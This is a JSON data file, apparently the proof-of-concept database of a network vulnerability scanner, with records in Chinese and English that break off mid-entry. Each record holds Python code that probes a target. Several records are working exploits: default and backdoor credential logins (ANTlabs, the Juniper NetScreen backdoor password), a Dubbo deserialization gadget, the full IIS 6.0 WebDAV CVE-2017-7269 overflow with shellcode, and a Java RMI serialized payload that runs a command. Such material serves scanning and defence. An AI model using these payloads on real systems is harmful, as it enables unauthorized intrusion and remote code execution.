{
    "RECORDS": [
        {
            "vulname": "antlabs_telnet_default_pass",
            "description": "ANTlabs IG3100 WIFI认证设备默认口令漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 23\n    pocdict = {\n        \"vulnname\":\"antlabs_telnet_default_pass\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        #连接Telnet服务器\n        tlib = telnetlib.Telnet(host, port, timeout=6)\n        #tlib.set_debuglevel(2)\n        #登陆\n        result = tlib.read_until(b\"login:\", timeout=6)\n        tlib.write(b\"console\\n\")\n        result = tlib.read_until(b\"Password:\", timeout=6)\n        tlib.write(b\"admin\\n\")\n        result = tlib.read_until(b\"ezxcess$\", timeout=6)\n        tlib.close()\n        if result.find(b\"ezxcess$\"):\n            pocdict['isvul'] = True\n            pocdict['payload'] = 'console:admin'\n            pocdict['proof'] = 'ezxcess$ console found'\n            pocdict['response'] = str(result)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "antlabs",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "dubbo_provider_deserialize_rce",
            "description": "Dubbo Provider默认反序列化漏洞(CVE-2020-1948)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 20880\n    pocdict = {\n        \"vulnname\":\"dubbo_provider_deserialize_rce\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        from dubbo.codec.hessian2 import Decoder,new_object\n        from dubbo.client import DubboClient\n        client = DubboClient(host, port)\n        JdbcRowSetImpl=new_object(\n            'com.sun.rowset.JdbcRowSetImpl',\n            dataSource=\"ldap://127.0.0.1:3345/Poc\",\n            strMatchColumns=[\"foo\"]\n        )\n        JdbcRowSetImplClass=new_object(\n            'java.lang.Class',\n            name=\"com.sun.rowset.JdbcRowSetImpl\",\n        )\n        toStringBean=new_object(\n            'com.rometools.rome.feed.impl.ToStringBean',\n            beanClass=JdbcRowSetImplClass,\n            obj=JdbcRowSetImpl\n        )\n\n        resp = client.send_request_and_return_response(\n            service_name='cn.dubbo_scanner_Tsldfs',\n            method_name='verify_sdfijwe',\n            args=[toStringBean])\n        if r\"Service not found:cn.dubbo_scanner_Tsldfs\" not in str(resp):\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(JdbcRowSetImpl)\n            pocdict['proof'] = 'deserialize service found'\n            pocdict['response'] = str(resp)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "dubbo",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "dubbo_telnet_unauth",
            "description": "Dubbo telnet 未授权访问漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 20880\n    pocdict = {\n        \"vulnname\":\"dubbo_telnet_unauth\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        #连接Telnet服务器\n        tlib = telnetlib.Telnet(host, port, timeout=6)\n        #tlib.set_debuglevel(2)\n        #登陆\n        result = tlib.read_until(b\"dubbo>\", timeout=6)\n        tlib.write(b\"status -l\\r\\n\")\n        result = tlib.read_until(b\"dubbo>\", timeout=6)\n        tlib.close()\n        if result.find(b\"datasource\"):\n            pocdict['isvul'] = True\n            pocdict['payload'] = 'status -l'\n            pocdict['proof'] = 'found datasource'\n            pocdict['response'] = str(result)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "dubbo",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "hid_discoveryd_blink_on_rce",
            "description": "HID discoveryd command blink_on任意代码执行漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 4070\n    pocdict = {\n        \"vulnname\":\"hid_discoveryd_blink_on_rce\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        payload = b'discover;013;'\n        sock.sendto(payload, (host, port))\n        resp = sock.recvfrom(1024)\n        if r\"discovered\" in str(resp):\n            pocdict['isvul'] = True\n            pocdict['payload'] = payload\n            pocdict['proof'] = 'discoveryed command execute'\n            pocdict['response'] = resp\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "hid",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "hp_jetdirect_unauth",
            "description": "惠普打印机telnet未授权访问",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 23\n    pocdict = {\n        \"vulnname\":\"hp_jetdirect_unauth\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        #连接Telnet服务器\n        tlib = telnetlib.Telnet(host, port, timeout=8)\n        #tlib.set_debuglevel(2)\n        #登陆\n        tlib.read_until(b\">\", timeout=8)\n        tlib.write(b\"/\\r\\n\")\n        result = tlib.read_until(b\"zrinfo>\", timeout=8)\n        tlib.close()\n        if result.find(b\"Printer Telnet Configuration\"):\n            pocdict['isvul'] = True\n            pocdict['payload'] = 'NULL'\n            pocdict['proof'] = 'telnet unauth'\n            pocdict['response'] = result\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "hp",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "iis_ms15034_httpsys_rce",
            "description": "IIS MS15034 http.sys远程代码执行漏洞(CVE-2015-1635)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 80\n    pocdict = {\n        \"vulnname\":\"iis_ms15034_httpsys_rce\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        payload = 'GET / HTTP/1.1\\r\\nHost: {0}\\r\\nRange: bytes=0-18446744073709551615\\r\\n\\r\\n'.format(host)\n        sock.connect((host, port))\n        sock.send(payload.encode())\n        response = sock.recv(1024).decode()\n        sock.close()\n        if \"Requested Range Not Satisfiable\" in response and \"nginx\" not in response:\n            pocdict['isvul'] = True\n            pocdict['payload'] = payload\n            pocdict['proof'] = 'Requested Range Not Satisfiable'\n            pocdict['response'] = response\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "iis",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "iis_webdav_rce",
            "description": "IIS 6.0 WebDAV远程代码执行漏洞(CVE-2017-7269)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 80\n    pocdict = {\n        \"vulnname\":\"iis_webdav_rce\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        pay = b'PROPFIND / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 0\\r\\n'\n        pay += b'If: <http://localhost/aaaaaaa'\n        pay += b'\\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac'\n        pay += b'>'\n        pay += b' (Not <locktoken:write1>) <http://localhost/bbbbbbb'\n        pay += b'\\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81'\n        shellcode = b'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397N30WRJLMSSI7LNR72JPTKOXPZKQH0CR615NMNRP0NQNWNMOGP206NYKPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJOBNVO0LMLJLMKZ0HOXOY0TO0OS260ENMNRP0NQOGNMOGOB06OIMP2345RCS3RET3D3M0KLK8SRM0KPM0C0SYK5NQWP2DDK0PNP4KQBLLTKQBMDDKD2MXLOGG0JO6NQKO6LOLQQSLKRNLMP7QXOLMM18G9RJRR2R74KQBLP4K0JOL4K0LN1RXK3PHKQHQ0Q4K29MPM19CTKQ9MH9SOJQ94KNTTKKQJ6P1KOFLY1XOLMKQXGNX9PD5KFM33MKHOKSMO42UJDPXTKB8O4KQIC1V4KLL0K4K0XMLKQXSTKKTTKKQJ0CYQ4O4MTQKQK1QR90Z0QKOYPQOQOQJ4KLRJKTM1MWKOWMCBR2OQZKPPSKOYEKPA'\n        pay += shellcode\n        pay += b'>\\r\\n\\r\\n'\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((host, port))\n        sock.sendall(pay)\n        try:\n            data = sock.recv(80960).decode('utf-8', 'ignore')\n        except:\n            pass\n        sock.close()\n        if not -1 == data.find('HHIT CVE-2017-7269 Success'):\n            pocdict['isvul'] = True\n            pocdict['payload'] = shellcode.decode('utf-8', 'ignore')\n            pocdict['proof'] = 'HHIT CVE-2017-7269 Success'\n            pocdict['response'] = data\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "iis",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "java_rmi_rce",
            "description": "JAVA反序列化命令执行漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 1099\n    pocdict = {\n        \"vulnname\":\"java_rmi_rce\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        send_packet_first = \"4a524d4900024b000c31302e3130312e32322e333900000000\"\n        send_packet_second=\"50aced00057722000000000000000000000000000000000000000000000000000044154dc9d4e63bdf7400057077\" \\\n                           \"6e6564737d00000001000f6a6176612e726d692e52656d6f746570787200176a6176612e6c616e672e7265666c65\" \\\n                           \"63742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f49\" \\\n                           \"6e766f636174696f6e48616e646c65723b7078707372003273756e2e7265666c6563742e616e6e6f746174696f6e\" \\\n                           \"2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62\" \\\n                           \"657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e67\" \\\n                           \"2f436c6173733b707870737200316f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d\" \\\n                           \"61702e5472616e73666f726d65644d617061773fe05df15a700300024c000e6b65795472616e73666f726d657274\" \\\n                           \"002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b\" \\\n                           \"4c001076616c75655472616e73666f726d657271007e000a707870707372003a6f72672e6170616368652e636f6d\" \\\n                           \"6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c7\" \\\n                           \"97ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f\" \\\n                           \"6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b7078707572002d5b4c6f72672e617061636865\" \\\n                           \"2e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007078\" \\\n                           \"70000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f\" \\\n                           \"72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7474\" \\\n                           \"00124c6a6176612f6c616e672f4f626a6563743b707870767200186a6176612e696f2e46696c654f757470757453\" \\\n                           \"747265616d00000000000000000000007078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c\" \\\n                           \"656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce38020003\" \\\n                           \"5b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400\" \\\n                           \"124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e\" \\\n                           \"672f436c6173733b707870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000070\" \\\n                           \"787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a9902000070787000000001\" \\\n                           \"767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000070787074000e676574436f6e737472\" \\\n                           \"7563746f727571007e001d000000017671007e001d7371007e00167571007e001b00000001757200135b4c6a6176\" \\\n                           \"612e6c616e672e537472696e673badd256e7e91d7b4702000070787000000001740023633a2f77696e646f77732f\" \\\n                           \"74656d702f4572726f7242617365457865632e636c61737374000b6e6577496e7374616e63657571007e001d0000\" \\\n                           \"00017671007e001b7371007e00167571007e001b00000001757200025b42acf317f8060854e00200007078700000\" \\\n                           \"0624cafebabe0000003200650a002000350700360700370a000300380a0002003907003a0a000600350a0002003b\" \\\n                           \"0a0006003c08003d0a0006003e0a003f00400a003f00410a004200430a001f00440700450700460a001100350800\" \\\n                           \"470a001100480a0011003e0a001000490a0010003e08004a0a001a004b07004c0a001a004908004d08004e0a001f\" \\\n                           \"004f0700500700510100063c696e69743e010003282956010004436f646501000f4c696e654e756d626572546162\" \\\n                           \"6c65010009726561644279746573010029284c6a6176612f696f2f496e70757453747265616d3b294c6a6176612f\" \\\n                           \"6c616e672f537472696e673b01000d537461636b4d61705461626c6507003607003a07004c01000a457863657074\" \\\n                           \"696f6e73070052010007646f5f65786563010015284c6a6176612f6c616e672f537472696e673b29560700450700\" \\\n                           \"450100046d61696e010016285b4c6a6176612f6c616e672f537472696e673b295601000a536f7572636546696c65\" \\\n                           \"0100124572726f7242617365457865632e6a6176610c002100220100166a6176612f696f2f427566666572656452\" \\\n                           \"65616465720100196a6176612f696f2f496e70757453747265616d5265616465720c002100530c00210054010016\" \\\n                           \"6a6176612f6c616e672f537472696e674275666665720c005500560c005700580100010a0c0059005607005a0c00\" \\\n                           \"5b005c0c005d005e07005f0c006000610c002500260100136a6176612f6c616e672f457863657074696f6e010017\" \\\n                           \"6a6176612f6c616e672f537472696e674275696c646572010005383838383a0c005700620c0021002e0100043838\" \\\n                           \"38380c006300640100106a6176612f6c616e672f537472696e670100020d0a01000a636d64202f63206469720c00\" \\\n                           \"2d002e01000d4572726f7242617365457865630100106a6176612f6c616e672f4f626a6563740100136a6176612f\" \\\n                           \"696f2f494f457863657074696f6e010018284c6a6176612f696f2f496e70757453747265616d3b2956010013284c\" \\\n                           \"6a6176612f696f2f5265616465723b2956010008726561644c696e6501001428294c6a6176612f6c616e672f5374\" \\\n                           \"72696e673b010006617070656e6401002c284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e\" \\\n                           \"672f537472696e674275666665723b010008746f537472696e670100116a6176612f6c616e672f52756e74696d65\" \\\n                           \"01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b010004657865630100\" \\\n                           \"27284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176\" \\\n                           \"612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f49\" \\\n                           \"6e70757453747265616d3b01002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f53\" \\\n                           \"7472696e674275696c6465723b010007696e6465784f66010015284c6a6176612f6c616e672f537472696e673b29\" \\\n                           \"490021001f0020000000000004000100210022000100230000001d00010001000000052ab70001b1000000010024\" \\\n                           \"00000006000100000003000900250026000200230000007b0005000500000038bb000259bb0003592ab70004b700\" \\\n                           \"054cbb000659b700074d2bb60008594ec600112c2db60009120ab6000957a7ffec2cb6000b3a041904b000000002\" \\\n                           \"00240000001a00060000000600100007001800090021000a002f000d0035000e0027000000110002fd0018070028\" \\\n                           \"070029fc001607002a002b000000040001002c0009002d002e00020023000000af0006000300000065b8000c2ab6\" \\\n                           \"000d4c2bb6000eb8000f4dbb001059bb001159b700121213b600142cb60014b60015b70016bf4c2bb600171218b6\" \\\n                           \"001902a400052bbfbb001059bb001159b700121213b60014bb001a592bb60017b7001bb60014121cb60014b60015\" \\\n                           \"b70016bf00010000002b002b0010000200240000001e0007000000130008001400100015002b0018002c001a0039\" \\\n                           \"001c003b001f00270000000c00026b07002ffc000f070030002b000000040001001000090031003200020023000\" \\\n                           \"000220001000100000006121db8001eb10000000100240000000a00020000002600050027002b00000004000100\" \\\n                           \"100001003300000002003474000577726974657571007e001d000000017671007e002e737200116a6176612e757\" \\\n                           \"4696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c\" \\\n                           \"647078703f4000000000000c7708000000100000000174000576616c756571007e003578787672001b6a6176612\" \\\n                           \"e6c616e672e616e6e6f746174696f6e2e5461726765740000000000000000000000707870\"\n        send_data_first = binascii.a2b_hex(send_packet_first)\n        send_data_second = binascii.a2b_hex(send_packet_second)\n        sock.connect((host, port))\n        sock.send(send_data_first)\n        recv_packet=sock.recv(1024)\n        flag = recv_packet[3:-4]\n        time.sleep(3)\n        sock.send(send_data_second)\n        packet = sock.recv(1024)\n        if flag in packet:\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(send_data_second)\n            pocdict['proof'] = flag\n            pocdict['response'] = packet\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "java",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "juniper_netscreen_backdoor",
            "description": "juniper NetScreen防火墙后门(CVE-2015-7755)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 22\n    pocdict = {\n        \"vulnname\":\"juniper_netscreen_backdoor\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        user = \"root\"\n        password = \"<<< %s(un='%s') = %u\"\n        from pexpect import pxssh\n        s = pxssh.pxssh()\n        s.login(host, user, password, port, auto_prompt_reset=False)\n        s.sendline(b'Get int')\n        s.prompt()\n        resp = s.before.find(b'Interfaces')\n        if resp:\n            pocdict['isvul'] = True\n            pocdict['payload'] = password\n            pocdict['proof'] = 'Interfaces found'\n            pocdict['response'] = resp\n        s.logout()\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "juniper",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "kinggate_zebra_conf",
            "description": "KingGate防火墙默认配置不当可被远控",
